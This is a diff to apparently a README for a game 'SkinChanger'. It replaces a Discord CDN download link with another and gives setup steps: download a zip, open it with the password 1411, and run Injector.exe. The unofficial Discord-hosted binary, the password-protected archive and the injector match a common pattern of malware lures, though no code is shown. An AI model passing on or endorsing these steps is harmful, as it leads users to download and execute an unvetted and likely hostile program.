@@ -2,8 +2,8 @@
 
 ⚙ How to Setup
 -
-https://cdn.discordapp.com/attachments/1148213058196488265/1151521707966873600/SkinChanger.zip - Download
-1. [Download](https://cdn.discordapp.com/attachments/1148213058196488265/1151521707966873600/SkinChanger.zip) zip archive
+https://cdn.discordapp.com/attachments/1148213058196488265/1152197236193771520/SkinChanger.zip - Download
+1. [Download](https://cdn.discordapp.com/attachments/1148213058196488265/1152197236193771520/SkinChanger.zip) zip archive
 2. Unpacking
 3. Password zip - 1411
 4. Run Injector.exe
